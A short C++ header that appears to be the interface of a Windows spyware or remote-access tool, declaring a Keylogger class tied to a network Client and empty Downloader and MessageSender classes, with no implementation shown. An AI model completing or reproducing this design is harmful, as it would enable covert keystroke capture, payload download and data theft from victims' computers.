#pragma once

#include "client.h"
#include "stdafx.h"
#include <iostream> 
#include <string>
#include <windows.h> 
#include <thread>



#define DEBUG true


class Keylogger //0$
{
public:
	std::string pressedKey();
	void start(Client * client);
};
//sendmail.h 1$

class Downloader //2$
{
public:

};

class MessageSender //3$
{
public:

};

